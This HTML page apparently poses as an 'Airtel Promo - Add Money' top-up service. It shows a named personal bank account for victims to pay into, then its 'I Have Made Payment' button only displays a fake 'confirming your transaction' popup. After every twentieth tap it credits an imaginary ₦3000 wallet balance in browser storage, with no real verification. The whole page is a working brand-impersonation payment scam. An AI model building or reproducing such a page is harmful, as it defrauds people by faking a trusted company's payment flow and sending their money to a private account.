<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Add Money</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: white;
      margin: 0;
      padding: 20px;
      overflow-x: hidden;
    }

    .background {
      position: fixed;
      top: 50%;
      left: 50%;
      width: 300px;
      transform: translate(-50%, -50%);
      opacity: 0.07;
      filter: blur(5px);
      z-index: 0;
      pointer-events: none;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    .card {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 0 10px rgba(200, 0, 0, 0.3);
      padding: 20px;
      text-align: center;
    }

    h2 {
      color: #d90000;
    }

    input[type="number"] {
      padding: 10px;
      width: 80%;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 16px;
      margin-top: 10px;
    }

    button {
      background-color: #d90000;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 12px 20px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }

    .popup {
      display: none;
      position: fixed;
      top: 30%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      border-radius: 15px;
      box-shadow: 0 0 20px #d90000aa;
      padding: 25px;
      z-index: 999;
      text-align: center;
    }

    .popup img {
      width: 60px;
      margin-bottom: 10px;
    }

    .popup.show {
      display: block;
    }
  </style>
</head>
<body>
  <img src="your-logo.png" class="background" />
  <div class="content">
    <div class="card" id="amountSection">
      <h2>Airtel Promo - Add Money</h2>
      <p>Enter amount to fund:</p>
      <input type="number" id="fundAmount" placeholder="₦1000" />
      <br />
      <button onclick="showAccount()">Continue</button>
    </div>

    <div class="card" id="accountSection" style="display:none;">
      <h2>Send Money To</h2>
      <p><b>Account Name:</b> EMMANUEL OKWUNNA</p>
      <p><b>Bank:</b> SmartCash Payment Service Bank</p>
      <p><b>Account Number:</b> 812 489 0070</p>
      <button onclick="handlePayment()">I Have Made Payment</button>
    </div>
  </div>

  <div class="popup" id="popup">
    <img src="your-logo.png" alt="Airtel" />
    <h3 style="color:#d90000;">Please wait...</h3>
    <p>We are confirming your transaction.</p>
  </div>

  <script>
    let tapCount = parseInt(localStorage.getItem('tapCount') || 0);
    let creditedRounds = parseInt(localStorage.getItem('creditedRounds') || 0);

    function showAccount() {
      const amount = document.getElementById("fundAmount").value;
      if (!amount || isNaN(amount) || amount < 100) {
        alert("Please enter a valid amount (min ₦100)");
        return;
      }
      document.getElementById("amountSection").style.display = "none";
      document.getElementById("accountSection").style.display = "block";
    }

    function handlePayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);

      const popup = document.getElementById("popup");
      popup.classList.add("show");

      setTimeout(() => {
        popup.classList.remove("show");
      }, 3000);

      const newRounds = Math.floor(tapCount / 20);
      if (newRounds > creditedRounds) {
        const reward = (newRounds - creditedRounds) * 3000;
        const user = JSON.parse(localStorage.getItem('user')) || { balance: 0 };
        user.balance = parseFloat(user.balance || 0) + reward;
        localStorage.setItem('user', JSON.stringify(user));
        localStorage.setItem('creditedRounds', newRounds);
        alert(`₦${reward} added to your wallet!`);
      }
    }
  </script>
</body>
</html>
